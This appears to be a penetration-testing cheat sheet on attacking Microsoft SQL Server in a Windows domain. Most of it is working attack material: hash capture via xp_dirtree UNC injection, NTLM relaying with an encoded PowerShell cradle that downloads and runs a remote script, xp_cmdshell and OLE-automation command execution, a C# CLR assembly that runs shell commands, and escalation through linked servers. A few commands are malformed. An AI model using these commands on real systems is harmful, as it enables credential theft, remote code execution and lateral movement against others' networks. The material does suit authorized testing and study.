**MSSQL Enumeration:**

In order to locate instances of MSSQL servers, we can run a network scan(port 1433/TCP) or if we are in an active directory enviromet we can query our domain DC for MSSQL SPNs. To do so, we can use the native "setspn" tool, or with [GetUsersSPNs.ps1]( https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1).

```
1. C:\> setspn -T corp1 -Q MSSQLSvc/*

2. PS C:\> .\GetUsersSPNs.ps1 
```

To know which user we used to log in, we can use this MSSQL query:

```
SELECT SYSTEM_USER;   -> if we logged in as "sa", this will return "sa"
```

To check our current user role we can use this MSSQL query:

```
SELECT IS_SRVROLEMEMBER('public');

SELECT IS_SRVROLEMEMBER('sysadmin');
```
(The "sysadmin" role is the MSSQL role with maximum privileges).

**CONNECTION AND AUTHENTICATION TO THE SERVER:**

Authentication to an MSSQL server, occurs in 2 stages:
  1. A login is requried. This login can be through Kerberos, or via an SQL server login which is performed with local accounts on each SQL     server.
  2. After a successfull login, the login is mapped to a database user account.

An example of this is that we may perform a SQL server login with the "sa" account, which is mapped to the "dbo" user account. However, if we perform a login with an account that doesn't has an SQL user account mapped, it will get mapped as the "guest" user. 

Generally the easiest ones to use are impacket-mssqlclient(to connect from linux) and the sqlcmd utility(to connect from windows). When using impacket-mssqlclient with active directory domain authentication don't forget the "-windows-auth" flag!

```
1. impacket-mssqlclient DOMAIN/username:password@<target-ip> -windows-auth   -> use the -windows-auth flag only if you are using a Kerberos login

~# impacket-mssqlclient -dc-ip 192.168.1.1 contoso.com/svc_sql:"SqlTest123!"@192.168.1.2 -windows-auth -> the password is only SqlTest123!, this is an example of kerberos login

~# ~# impacket-mssqlclient svc_sql:"SqlTest123!"@192.168.1.2 -> SQL server login

2. C:\> sqlcmd -S <computer_name> -U <username> -P <password>

C:\> sqlcmd -S appsrv01.contoso.com -U 'svc_sql' -P 'SqlTest123!' -> SQL server login

C:\> sqlcmd -S 192.168.1.2 -U 'svc_sql' -P 'SqlTest123!' -> SQL server login

C:\> sqlcmd -E appsrv01.contoso.com -> Kerberos login
```
(Note that when using the sqlcmd utility, you need to type "GO" in order to run your queries, if you don't type "GO" your queries won't be executed)

IMPORTANT: Mainly all commands specified in this document are meant to be thrown through an impacket-mssqlclient or sqlcmd shell.

**UNC PATH Injection and Hash Relaying:**

Remember that you cannot relay a hash to the origin computer, or to a computer that has the SMB signing enabled(which DC have by default).

Additionally, you can opt to only capture the hash and try to "break" it:

```
1st ~# responder -I tun0  -> Capturing the hash with responder, use the -I parameter to indicate your network interface

Then save the hash to a file(like "hash.txt" in this example).

2nd ~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Throw this command and verify that the authentication with you SMB server was successful:

```
xp_dirtree \\192.168.1.1\test\;
```
You can easily create your SMB server with impacket:

```
~# impacket-smbserver test $(pwd) -smb2support
```
To relay the Net-NTLMv2 hash that you obtained with the xp_dirtree command you can use impacket-ntmlrelayx:

```
~# impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AC
kALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAu
ADEAMQA4AC4AOQA6ADgAMQAvAHIAdQBuAC4AcABzADEAJwApACAAfAAgAEkARQBYAA=='
```

**PRIVILEGE ESCALATION:**

Impersonation can be performed in two ways, first it can be done at a login level using the "EXECUTE AS LOGIN" statement, or it can be done at a user level with the "EXECUTE AS USER" statement.

*Impersonation at a login level:*

Enumerating users that can be impersonated at a login level. It is important to note that this query won't return us the user that is allowed to impersonate.

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```
To impersonate at a login level use this statement(assuming you can impersonate the sa user):

```
EXECUTE AS LOGIN = sa;
```

*Impersonation at a user level:*

In order to execute this attack, there are to prerequisites. First our user have been granted with impersonation. Second, in order to fully compromise a database server, the user we impersonate must be in a database that has the "TRUSTWORTHY" property set. If the database we impersonate on doesn't have the "TRUSTWORTHY" property, this doesn't necessarily lead to a server-wide sysadmin rolership.

In our example the "guest" user has been granted with impersonation over the "dbo" user on the "msdb" database. Note that the "msdb" database is the only database which has the "TRUSTWORTHY" property set by default.

Now, to impersonate we can use this statements:

```
1. use msdb;

2. EXECUTE AS USER = 'dbo';
```

**CODE EXECUTION:**

*Through xp_cmdshell:*

Use this commands at this order:

```
1st EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

2nd EXEC xp_cmdshell "whoami";
```

*Through sp_oacreate and sp_oamethod:*

First, we will instanitate Windows Script Host using the "sp_oacreate" statement, and then we will use the "sp_oamethod" to call the Windows Script Host "run" method.

```
1. DECLARE @myshell INT;      -> the "@myshell" variable is where we want our OLE object to be stored

2. EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;

3.  EXEC sp_oamethod @myshell, 'run', null, 'whoami';
```

However, since "sp_oacreate" and "sp_oamethod" are disabled by default we must first enable them:

```
1. EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

**CUSTOM ASSEMBLIES:**

Databases with the "TRUSTWORTHY" property set, can also import managed DLL as objects through the "CREATE ASSEMBLY" statement. So we will try to abuse this. (In our example we will target the "msdb" database)

Managed DLL code:

```
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

public class StoredProcedures
{
  [Microsoft.SqlServer.Server.SqlProcedure]
   public static void cmdExec (SqlString execCommand)
   {
     Process proc = new Process();
     proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
     proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
     proc.StartInfo.UseShellExecute = false;
     proc.StartInfo.RedirectStandardOutput = true;
     proc.Start();
     SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
     SqlContext.Pipe.SendResultsStart(record);
     record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
     SqlContext.Pipe.SendResultsRow(record);
     SqlContext.Pipe.SendResultsEnd();
     proc.WaitForExit();
     proc.Close();
   }
};
```

Now, we need to enable the CLR Integration, and disable the "clr strict security" option:

```
1. use msdb;

2. EXEC sp_configure 'show advanced options',1; RECONFIGURE;

3. EXEC sp_configure 'clr enabled',1; RECONFIGURE;

4. EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
```

Now, we will create the assembly and a procedure for it:

```
1. CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;

2. CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];

3. EXEC cmdExec 'whoami'
```

To drop an assembly and its procedures:

```
1. DROP PROCEDURE dbo.cmdExec;

2. DROPASSEMBLY myAssembly;
```

In order to avoid to put our DLL on disk, we can convert it to hexadecimal and use the "CREATE ASSEMBLY" statement with the hex string of our DLL. 

To convert our DLL to an hexadecimal string we will use this powershell script:

```
$assemblyFile = "C:\cmdExec.dll"
$stringBuilder = New-Object -Type System.Text.StringBuilder 
$fileStream = [IO.File]::OpenRead($assemblyFile)

while (($byte = $fileStream.ReadByte()) -gt -1)
{
  $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}

$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
```

Now we will create our assembly using the following statement:

```
CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE;
```

**CODE EXECUTION ON A LINKED MSSQL SERVER:**

To list linked SQL servers(2 ways):

```
exec sp_linkedservers;

SELECT * FROM sys.servers;
```
For this example, assume that dc01 is the linked server. 

```
1st EXEC (sp_configure 'show advanced options', 1; RECONFIGURE;) AT dc01

2nd EXEC (sp_configure 'xp_cmdshell', 1; RECONFIGURE;) AT dc01

3rd EXEC (xp_cmdshell 'whoami';) AT dc01
```

**PRIVILEGE ESCALATION THROUGHA LINKED MSSQLSERVER:**

Supose that we have low privileges on our current MSSQL server, however there is a linked MSSQL server where we do have high privileges. So how do we do to gain high privileges on our first MSSQL server?
(For demonstration purposes we have low privileges on dc01 but high privileges on appsrv01)

Here are the commands we must throw through dc01:

```
1st EXEC ('EXEC (sp_configure "show advanced options", 1; reconfigure;  ) AT appsrv01') AT dc01

2nd EXEC ('EXEC (sp_configure "xp_cmdshell", 1; reconfigure;) AT appsrv01') AT dc01

3rd EXEC ('EXEC (xp_cmdshell "whoami";) AT appsrv01') AT dc01
```

